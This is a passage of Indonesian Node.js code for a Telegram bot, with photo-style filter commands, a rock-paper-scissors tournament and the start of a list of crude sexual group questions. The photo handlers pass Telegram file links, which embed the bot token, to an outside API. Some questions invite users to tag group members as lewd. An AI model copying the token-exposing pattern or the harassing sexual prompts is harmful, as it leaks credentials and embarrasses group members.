    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.tobabiAsk = ask.message_id;
});

// Saat user mengirim foto untuk /tobabi
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /tobabi
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tobabiAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ 𝙼𝚎𝚗𝚐𝚞𝚋𝚊𝚑 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚔𝚎 𝚐𝚊𝚢𝚊 𝚃𝚘𝚋𝚊𝚋𝚒...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tobabi?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "tobabi_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🐷✨ 𝙵𝚘𝚝𝚘 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑 𝚔𝚎 *𝚐𝚊𝚢𝚊 𝚃𝚘𝚋𝚊𝚋𝚒*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚖𝚙𝚛𝚘𝚜𝚎𝚜 𝚏𝚘𝚝𝚘 𝚃𝚘𝚋𝚊𝚋𝚒.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.tobabiAsk = null;
});
// ========= FITUR /todpr =========
bot.onText(/\/todpr/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🏛️ *𝙺𝚒𝚛𝚒𝚖 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚍𝚎𝚗𝚐𝚊𝚗 𝚖𝚎𝚖𝚋𝚊𝚕𝚊𝚜 (𝚛𝚎𝚙𝚕𝚢) 𝚙𝚎𝚜𝚊𝚗 𝚒𝚗𝚒 — 𝚊𝚔𝚊𝚗 𝚍𝚒𝚞𝚋𝚊𝚑 𝚔𝚎 𝚐𝚊𝚢𝚊 𝚃𝚘𝚍𝚙𝚛.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.todprAsk = ask.message_id;
});

// Saat user mengirim foto untuk /todpr
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /todpr
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.todprAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ 𝙼𝚎𝚗𝚐𝚞𝚋𝚊𝚑 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚔𝚎 𝚐𝚊𝚢𝚊 𝚃𝚘𝚍𝚙𝚛...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/todpr?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "todpr_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🏛️✨ 𝙵𝚘𝚝𝚘 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑 𝚔𝚎 *𝚐𝚊𝚢𝚊 𝚃𝚘𝚍𝚙𝚛*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚖𝚙𝚛𝚘𝚜𝚎𝚜 𝚏𝚘𝚝𝚘 𝚃𝚘𝚍𝚙𝚛.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.todprAsk = null;
});
// ========= FITUR /toanime =========
bot.onText(/\/toanime/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🎌 *𝙺𝚒𝚛𝚒𝚖 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚍𝚎𝚗𝚐𝚊𝚗 𝚖𝚎𝚖𝚋𝚊𝚕𝚊𝚜 (𝚛𝚎𝚙𝚕𝚢) 𝚙𝚎𝚜𝚊𝚗 𝚒𝚗𝚒 — 𝚊𝚔𝚊𝚗 𝚍𝚒𝚞𝚋𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚐𝚊𝚢𝚊 𝙰𝚗𝚒𝚖𝚎.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.toanimeAsk = ask.message_id;
});

// Saat user mengirim foto untuk /toanime
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /toanime
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.toanimeAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ 𝙼𝚎𝚗𝚐𝚞𝚋𝚊𝚑 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚐𝚊𝚢𝚊 𝙰𝚗𝚒𝚖𝚎...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/toanime?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman (kayak /tomekah & /topiramida)
        const tempPath = path.join(__dirname, "toanime_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🎌✨ 𝙵𝚘𝚝𝚘 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 *𝚐𝚊𝚢𝚊 𝙰𝚗𝚒𝚖𝚎*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚖𝚙𝚛𝚘𝚜𝚎𝚜 𝚏𝚘𝚝𝚘 𝙰𝚗𝚒𝚖𝚎.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.toanimeAsk = null;
});
// ========= FITUR /topiramida =========
bot.onText(/\/topiramida/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "📸 *𝙺𝚒𝚛𝚒𝚖 𝚏𝚘𝚝𝚘 𝚍𝚎𝚗𝚐𝚊𝚗 𝚖𝚎𝚖𝚋𝚊𝚕𝚊𝚜 (𝚛𝚎𝚙𝚕𝚢) 𝚙𝚎𝚜𝚊𝚗 𝚒𝚗𝚒 — 𝚊𝚔𝚊𝚗 𝚍𝚒𝚞𝚋𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚐𝚊𝚢𝚊 𝚃𝚘𝚙𝚒𝚛𝚊𝚖𝚒𝚍𝚊.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.topiramidaAsk = ask.message_id;
});

// Saat user mengirim foto untuk /topiramida
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /topiramida
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.topiramidaAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ 𝙼𝚎𝚗𝚐𝚞𝚋𝚊𝚑 𝚏𝚘𝚝𝚘 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚐𝚊𝚢𝚊 𝚃𝚘𝚙𝚒𝚛𝚊𝚖𝚒𝚍𝚊...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/topiramida?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "topiramida_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "📸✨ 𝙵𝚘𝚝𝚘 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 *𝚐𝚊𝚢𝚊 𝚃𝚘𝚙𝚒𝚛𝚊𝚖𝚒𝚍𝚊*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚖𝚙𝚛𝚘𝚜𝚎𝚜 𝚏𝚘𝚝𝚘 𝚃𝚘𝚙𝚒𝚛𝚊𝚖𝚒𝚍𝚊.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.topiramidaAsk = null;
});
// ========= FITUR /topolaroid =========
bot.onText(/\/topolaroid/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "📸 *𝙺𝚒𝚛𝚒𝚖 𝚏𝚘𝚝𝚘 𝚍𝚎𝚗𝚐𝚊𝚗 𝚖𝚎𝚖𝚋𝚊𝚕𝚊𝚜 (𝚛𝚎𝚙𝚕𝚢) 𝚙𝚎𝚜𝚊𝚗 𝚒𝚗𝚒 — 𝚊𝚔𝚊𝚗 𝚍𝚒𝚞𝚋𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚐𝚊𝚢𝚊 𝚃𝚘𝚙𝚘𝚕𝚊𝚛𝚘𝚒𝚍.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.topolaroidAsk = ask.message_id;
});

// Saat user mengirim foto (handler umum, sama kayak punyamu yang lain)
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Kalau bukan reply ke pesan /topolaroid, lewatin aja
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.topolaroidAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ 𝙼𝚎𝚗𝚐𝚞𝚋𝚊𝚑 𝚏𝚘𝚝𝚘 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚐𝚊𝚢𝚊 𝚃𝚘𝚙𝚘𝚕𝚊𝚛𝚘𝚒𝚍...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/topolaroid?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "topolaroid_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "📸✨ 𝙵𝚘𝚝𝚘 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 *𝚐𝚊𝚢𝚊 𝚃𝚘𝚙𝚘𝚕𝚊𝚛𝚘𝚒𝚍*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Topolaroid.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.topolaroidAsk = null;
});

// ===================== FITUR SUIT (BATU-GUNTING-KERTAS) =====================
const suitRooms = {};
const SUIT_TARGET_SCORE = 5; // poin menang per match

function normalizeSuitChoice(text) {
  if (!text || typeof text !== 'string') return null;
  let t = text.trim().toLowerCase();
  if (t.startsWith('/')) t = t.slice(1);

  if (t === 'batu' || t === '👊' || t === '👊🏻') return 'batu';
  if (t === 'gunting' || t === '✌' || t === '✌🏻') return 'gunting';
  if (t === 'kertas' || t === '🖐' || t === '🖐🏻' || t === '✋') return 'kertas';
  return null;
}

function decideSuit(p1Id, p1Choice, p2Id, p2Choice) {
  if (p1Choice === p2Choice) return { type: 'draw' };

  const winMap = {
    batu: 'gunting',
    gunting: 'kertas',
    kertas: 'batu'
  };

  if (winMap[p1Choice] === p2Choice) {
    return { type: 'win', winner: p1Id, loser: p2Id };
  } else {
    return { type: 'win', winner: p2Id, loser: p1Id };
  }
}

// mulai satu match (p1 vs p2)
async function startSuitMatch(chatId) {
  const room = suitRooms[chatId];
  if (!room) return;

  if (room.roundIndex >= room.roundPairs.length) return;

  const pair = room.roundPairs[room.roundIndex];
  const p1Id = pair.p1Id;
  const p2Id = pair.p2Id;

  const p1 = room.players.find(p => p.id === p1Id);
  const p2 = room.players.find(p => p.id === p2Id);
  if (!p1 || !p2) return;

  const g1 = room.groupMap[p1Id] || '?';
  const g2 = room.groupMap[p2Id] || '?';

  room.currentMatch = {
    p1Id,
    p2Id,
    p1Name: p1.name,
    p2Name: p2.name,
    scores: { [p1Id]: 0, [p2Id]: 0 }
  };
  room.currentChoices = {};

  await bot.sendMessage(
    chatId,
    `🃏 Ronde ${room.roundNumber} – Match ${room.roundIndex + 1}\n` +
    `Grup ${g1}: ${p1.name} vs Grup ${g2}: ${p2.name}\n\n` +
    `Main sampai ${SUIT_TARGET_SCORE} poin.\n` +
    `Sekarang giliran ${p1.name} dan ${p2.name} memilih suit di chat pribadi bot.`
  );

  const msgP1 =
    `Giliranmu bermain suit melawan ${p2.name}.\n` +
    `Ketik salah satu: /batu, /gunting, atau /kertas`;
  const msgP2 =
    `Giliranmu bermain suit melawan ${p1.name}.\n` +
    `Ketik salah satu: /batu, /gunting, atau /kertas`;

  bot.sendMessage(p1Id, msgP1).catch(() => {});
  bot.sendMessage(p2Id, msgP2).catch(() => {});
}

// pasangan per ronde: (1,2), (3,4) dst
async function setupSuitRound(chatId, participantsIds) {
  const room = suitRooms[chatId];
  if (!room) return;

  const ids = participantsIds.slice();
  const pairs = [];
  const advancing = [];

  for (let i = 0; i + 1 < ids.length; i += 2) {
    pairs.push({ p1Id: ids[i], p2Id: ids[i + 1] });
  }

  if (ids.length % 2 === 1) {
    const byeId = ids[ids.length - 1];
    advancing.push(byeId);
    const byePlayer = room.players.find(p => p.id === byeId);
    if (byePlayer) {
      await bot.sendMessage(
        chatId,
        `🎫 ${byePlayer.name} mendapat bye ke ronde berikutnya (tanpa bermain).`
      );
    }
  }

  room.roundPairs = pairs;
  room.roundIndex = 0;
  room.advancing = advancing;
  room.roundNumber = room.roundNumber || 1;

  if (pairs.length === 0) {
    if (advancing.length === 1) {
      const champ = room.players.find(p => p.id === advancing[0]);
      if (champ) {
        await bot.sendMessage(chatId, `🏆 Pemenang turnamen suit adalah ${champ.name}!`);
      }
      delete suitRooms[chatId];
    }
    return;
  }

  await startSuitMatch(chatId);
}

// ===== /suitroom =====
bot.onText(/^\/suitroom(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;

  if (suitRooms[chatId]) {
    const room = suitRooms[chatId];
    return bot.sendMessage(
      chatId,
      `❌ Sudah ada room Suit di grup ini.\n` +
      `Creator: ${room.creatorName}\n` +
      `Gunakan /suitexit untuk menutup room.`
    );
  }

  const name =
  [user.first_name, user.last_name]
    .filter(Boolean)
    .join(" ") ||
  user.username ||
  `User ${user.id}`;

  suitRooms[chatId] = {
    creatorId: user.id,
    creatorName: name,
    started: false,
    players: [{ id: user.id, name }],
    groupMap: { [user.id]: 1 },
    roundNumber: 1,
    roundPairs: [],
    roundIndex: 0,
    advancing: [],
    currentMatch: null,
    currentChoices: {}
  };

  await bot.sendMessage(
    chatId,
    `🃏 Room Suit dibuat!\n\n` +
    `Creator: ${name}\n` +
    `Pemain: 1 (min 4, max 10, dan harus kelipatan 4: 4 atau 8 pemain)\n` +
    `Grup 1: ${name}\n\n` +
    `Pemain lain bisa /suitjoin untuk gabung.\n` +
    `Creator ketik /suitstart untuk memulai turnamen.`
  );

  bot.sendMessage(
    user.id,
    `Kamu membuat room Suit di grup.\n` +
    `Nanti pilihan suit (batu/gunting/kertas) dilakukan di chat ini.`
  ).catch(() => {});
});

// ===== /suitjoin =====
bot.onText(/^\/suitjoin(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;
  const room = suitRooms[chatId];

  if (!room) {
    return bot.sendMessage(
      chatId,
      `❌ Belum ada room Suit di grup ini.\nBuat dulu dengan /suitroom.`
    );
  }

  if (room.started) {
    return bot.sendMessage(chatId, `❌ Turnamen Suit sudah dimulai, tidak bisa join lagi.`);
  }

  if (room.players.some(p => p.id === user.id)) {
    return bot.sendMessage(chatId, `➥ Kamu sudah terdaftar sebagai pemain Suit.`);
  }

  if (room.players.length >= 10) {
    return bot.sendMessage(chatId, `❌ Room Suit sudah penuh (maksimal 10 pemain = 5 grup).`);
  }

  // wajib bisa DM
  try {
    await bot.sendMessage(
      user.id,
      `✅ Kamu berhasil join turnamen Suit di salah satu grup.\n` +
      `Setiap ronde, balas: /batu, /gunting, atau /kertas di sini.`
    );
  } catch (err) {
    return bot.sendMessage(
      chatId,
      `❌ ${getDisplayName(user)}, bot tidak bisa mengirim pesan ke kamu.\n` +
      `Silakan chat bot ini di privat dulu (Start), lalu /suitjoin lagi.`
    );
  }

  const name = getDisplayName(user);
  room.players.push({ id: user.id, name });

  // tiap 2 pemain = 1 grup
  const idx = room.players.length - 1;
  const groupNo = Math.floor(idx / 2) + 1;
  room.groupMap[user.id] = groupNo;

  const groups = {};
  for (const p of room.players) {
    const g = room.groupMap[p.id] || '?';
    if (!groups[g]) groups[g] = [];
    groups[g].push(p.name);
  }

  const groupsText = Object.keys(groups)
    .sort((a, b) => Number(a) - Number(b))
    .map(g => `Grup ${g}: ${groups[g].join(', ')}`)
    .join('\n');

  await bot.sendMessage(
    chatId,
    `✅ ${name} join turnamen Suit di Grup ${groupNo}!\n\n` +
    `Daftar grup sekarang:\n` +
    groupsText + `\n\nCreator bisa /suitstart kalau sudah cukup pemain.`
  );
});

// ===== /suitstart =====
bot.onText(/^\/suitstart(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;
  const room = suitRooms[chatId];

  if (!room) {
    return bot.sendMessage(chatId, `❌ Belum ada room Suit di grup ini. Buat dulu dengan /suitroom.`);
  }

  if (room.creatorId !== user.id) {
    return bot.sendMessage(chatId, `❌ Hanya creator room Suit yang bisa memulai turnamen.`);
  }

  if (room.started) {
    return bot.sendMessage(chatId, `➥ Turnamen Suit sudah berjalan.`);
  }

  const playerCount = room.players.length;
  if (playerCount < 4 || playerCount % 4 !== 0) {
    return bot.sendMessage(
      chatId,
      `❌ Jumlah pemain harus 4 atau 8 orang (kelipatan 4),` +
      ` karena 1 grup berisi 2 orang dan harus grup vs grup tanpa sisa.`
    );
  }

  // pastikan setiap grup berisi 2 orang dan jumlah grup genap
  const groups = {};
  for (const p of room.players) {
    const g = room.groupMap[p.id];
    if (!groups[g]) groups[g] = [];
    groups[g].push(p);
  }
  const groupNos = Object.keys(groups).map(Number).sort((a, b) => a - b);

  // tiap grup harus 2 orang
  for (const g of groupNos) {
    if (groups[g].length !== 2) {
      return bot.sendMessage(
        chatId,
        `❌ Grup ${g} belum berisi 2 orang penuh, tidak bisa mulai.`
      );
    }
  }
  if (groupNos.length % 2 !== 0) {
    return bot.sendMessage(
      chatId,
      `❌ Jumlah grup harus genap (2 atau 4 grup). Sekarang: ${groupNos.length} grup.`
    );
  }

  room.started = true;
  room.roundNumber = 1;

  // susun urutan peserta: G1A, G2A, G1B, G2B, G3A, G4A, G3B, G4B, ...
  const participantIds = [];
  for (let i = 0; i < groupNos.length; i += 2) {
    const gA = groups[groupNos[i]];
    const gB = groups[groupNos[i + 1]];

    // slot A (index 0), lalu slot B (index 1)
    participantIds.push(gA[0].id, gB[0].id);
    participantIds.push(gA[1].id, gB[1].id);
  }

  await bot.sendMessage(
    chatId,
    `🚀 Turnamen Suit dimulai!\n` +
    `Total pemain: ${playerCount} (grup: ${groupNos.length})\n` +
    `Setiap match: dua pemain suit sampai ${SUIT_TARGET_SCORE} poin (pemenang lanjut ke babak selanjutnya).\n` +
    `Pilihan suit dilakukan di chat pribadi, bukan di grup.`
  );

  await setupSuitRound(chatId, participantIds);
});

// ===== /suitexit =====
bot.onText(/^\/suitexit(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;
  const room = suitRooms[chatId];

  if (!room) {
    return bot.sendMessage(chatId, `❌ Tidak ada turnamen Suit aktif di grup ini.`);
  }

  if (room.creatorId !== user.id) {
    return bot.sendMessage(chatId, `❌ Hanya creator room Suit yang bisa menghentikan turnamen.`);
  }

  delete suitRooms[chatId];

  await bot.sendMessage(chatId, `🛑 Turnamen Suit dibatalkan oleh ${getDisplayName(user)}.`);
});

// ===== HANDLER PRIVATE CHAT UNTUK SUIT =====

bot.on('message', async (msg) => {
  if (!msg.chat || msg.chat.type !== 'private') return;
  if (!msg.text) return;

  const userId = msg.from.id;
  const choice = normalizeSuitChoice(msg.text);
  if (!choice) return;

  let targetChatId = null;
  let room = null;

  for (const [chatIdStr, r] of Object.entries(suitRooms)) {
    if (!r.started || !r.currentMatch) continue;
    const { p1Id, p2Id } = r.currentMatch;
    if (p1Id === userId || p2Id === userId) {
      targetChatId = Number(chatIdStr);
      room = r;
      break;
    }
  }

  if (!room || !targetChatId) return;

  const { p1Id, p2Id, p1Name, p2Name, scores } = room.currentMatch;

  if (!room.currentChoices) room.currentChoices = {};
  if (room.currentChoices[userId]) {
    return bot.sendMessage(
      userId,
      `Kamu sudah memilih "${room.currentChoices[userId]}". Tunggu lawanmu.`
    );
  }

  room.currentChoices[userId] = choice;
  await bot.sendMessage(userId, `✅ Kamu memilih: ${choice}. Tunggu lawanmu memilih.`);

  const c1 = room.currentChoices[p1Id];
  const c2 = room.currentChoices[p2Id];

  if (!c1 || !c2) return;

  const result = decideSuit(p1Id, c1, p2Id, c2);

  let groupMsg =
    `🃏 Hasil suit ${p1Name} vs ${p2Name}:\n` +
    `${p1Name} memilih: ${c1}\n` +
    `${p2Name} memilih: ${c2}\n`;

  if (result.type === 'draw') {
    groupMsg += `\n👏🏻 Seri! Tidak ada yang mendapat poin.`;
  } else {
    const winnerId = result.winner;
    const loserId = result.loser;
    scores[winnerId] = (scores[winnerId] || 0) + 1;
    scores[loserId] = scores[loserId] || 0;

    const winnerName = winnerId === p1Id ? p1Name : p2Name;
    groupMsg += `\n🏅 Pemenang ronde ini: ${winnerName}\n` +
                `Skor sekarang:\n` +
                `${p1Name}: ${scores[p1Id] || 0}\n` +
                `${p2Name}: ${scores[p2Id] || 0}`;
  }

  room.currentChoices = {};

  const scoreP1 = scores[p1Id] || 0;
  const scoreP2 = scores[p2Id] || 0;
  let matchFinished = false;
  let matchWinnerId = null;
  let matchWinnerName = null;

  if (scoreP1 >= SUIT_TARGET_SCORE || scoreP2 >= SUIT_TARGET_SCORE) {
    matchFinished = true;
    if (scoreP1 > scoreP2) {
      matchWinnerId = p1Id;
      matchWinnerName = p1Name;
    } else {
      matchWinnerId = p2Id;
      matchWinnerName = p2Name;
    }

    groupMsg += `\n\n🎉 Match selesai!\n` +
                `Pemenang match: ${matchWinnerName} (skor ${scoreP1} - ${scoreP2}).`;
  } else if (result.type !== 'draw') {
    groupMsg += `\n\nLanjut ronde berikutnya pada match yang sama.\n` +
                `Pilih lagi di chat pribadi.`;
    bot.sendMessage(p1Id, `Ronde berikutnya vs ${p2Name}.\nBalas: /batu, /gunting, atau /kertas.`);
    bot.sendMessage(p2Id, `Ronde berikutnya vs ${p1Name}.\nBalas: /batu, /gunting, atau /kertas.`);
  } else {
    bot.sendMessage(p1Id, `Seri.\nBalas lagi: /batu, /gunting, atau /kertas.`);
    bot.sendMessage(p2Id, `Seri.\nBalas lagi: /batu, /gunting, atau /kertas.`);
  }

  await bot.sendMessage(targetChatId, groupMsg);

  if (!matchFinished) return;

  room.advancing.push(matchWinnerId);

  room.roundIndex += 1;

  if (room.roundIndex < room.roundPairs.length) {
    await startSuitMatch(targetChatId);
    return;
  }

  const nextParticipants = room.advancing.slice();
  room.currentMatch = null;
  room.currentChoices = {};
  room.roundPairs = [];
  room.roundIndex = 0;
  room.advancing = [];

  if (nextParticipants.length === 1) {
    const champ = room.players.find(p => p.id === nextParticipants[0]);
    if (champ) {
      await bot.sendMessage(
        targetChatId,
        `🏆 Turnamen Suit selesai!\nPemenang akhirnya adalah: ${champ.name}!`
      );
    }
    delete suitRooms[targetChatId];
    return;
  }

  room.roundNumber += 1;

  await bot.sendMessage(
    targetChatId,
    `\n💫 Ronde ${room.roundNumber} akan dimulai.\n` +
    `Pemain yang lolos: ` +
    nextParticipants
      .map(id => {
        const pl = room.players.find(p => p.id === id);
        return pl ? pl.name : id;
      })
      .join(', ')
  );

  await setupSuitRound(targetChatId, nextParticipants);
});

// ===================== TEBAK PIKIRAN JOROK NGAKAK (100 pertanyaan) =====================
bot.onText(/\/tebakpikiranku(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;
  const fromUser = msg.from.first_name;

  const pertanyaan = [
    "Kalau kamu punya remote buat pause waktu, apa hal nakal pertama yang kamu lakuin? 😏",
    "Pernah ga lagi coli terus tiba-tiba ada yang manggil? Gimana reaksimu? 🤣",
    "Lebih milih ga makan 3 hari atau ga coli 1 bulan? 😅",
    "Kalau ada artis yang tiba-tiba ngajak ngamar, siapa yang langsung kamu iyain? 😳",
    "Pilih: bokep HD tapi lemot atau bokep buram tapi lancar? 🤔",
    "Siapa orang di grup ini yang paling kelihatan mesum? Tag namanya! 😂",
    "Kalau hp-mu tiba-tiba kepegang emak, aplikasi apa yang paling kamu takutin kebuka duluan? 📱",
    "Pernah ga mimpi basah gara-gara orang yang ga kamu sangka? Ceritain dong 😝",
    "Kalau lagi coli terus listrik mati, lanjut atau berhenti? 🔦",
    "Lebih milih ketahuan pacar lagi coli atau ketahuan dosen lagi buka bokep? 🎓",
    "Kalau kamu bisa masuk ke otak temenmu, kira-kira hal mesum apa yang bakal kamu lihat? 👀",
    "Siapa di grup ini yang kayaknya paling sering nyimpen bokep di galeri? 📂",
    "Pernah ga pura-pura tidur biar bisa nguping orang lagi mesum? 🤫",
    "Kalau disuruh pilih: ga punya tangan atau ga punya internet, kamu pilih mana? 🤯",
    "Siapa tokoh kartun pertama yang bikin kamu mikir jorok waktu kecil? 🤭",
    "Lebih milih coli di kamar kos atau di wc umum? 🚽",
    "Kalau bot ini bisa ngasih rating tingkat mesummu (1-100), kira-kira kamu dapet berapa? 📊",
    "Pernah ga salah kirim bokep ke grup keluarga? Gimana rasanya? 😱",
    "Kalau ada malaikat pencatat coli, kira-kira bukunya udah tebel belum? 📖",
    "Kalau harus milih, coli pake tangan kanan atau tangan kiri? ✋🤚",
    "Pernah ga nonton bokep pake headset tapi colokan copot, terus kedengeran keras-keras? 🎧😂",
    "Kalau semua history browser kamu di-share ke grup ini, siapa yang paling kaget? 🌐",
    "Lebih milih coli ketahuan tetangga atau ketahuan guru ngaji? 😬",
    "Kalau ada jin bisa ngabulin 1 permintaan mesum, kamu minta apa? 🧞",
    "Kalau harus pilih pasangan dari grup ini buat roleplay nakal, siapa yang kamu pilih? 🎭",
    "Pernah ga pura-pura sakit biar bisa coli sendirian di rumah? 🤒",
    "Kalau ada aplikasi baca pikiran, hal pertama yang malu kalau ketahuan apa? 💭",
    "Kalau harus stop coli 1 tahun tapi dapet 1M, kamu sanggup ga? 💸",
    "Siapa di grup ini yang wajahnya polos tapi pikiran mesum? 😇👉😈",
    "Kalau kamu punya 3 keinginan jorok yang pasti terkabul, apa aja tuh? 😏🔥",
    "Lebih milih bokep Jepang atau bokep Barat? 🎥",
    "Kalau di hp-mu ada folder rahasia, isinya paling banyak apa? 📂",
    "Pernah ga mimpi nakal sama orang yang kamu benci? 😳",
    "Kalau ada kompetisi coli tercepat, kamu kira bisa juara berapa? 🏆",
    "Kalau emakmu tau seberapa sering kamu coli, kira-kira reaksinya gimana? 😭",
    "Siapa selebgram yang bikin kamu pengen buka IG tiap hari? 📸",
    "Kalau ada game rating mesum, kira-kira skor kamu berapa? 🎮",
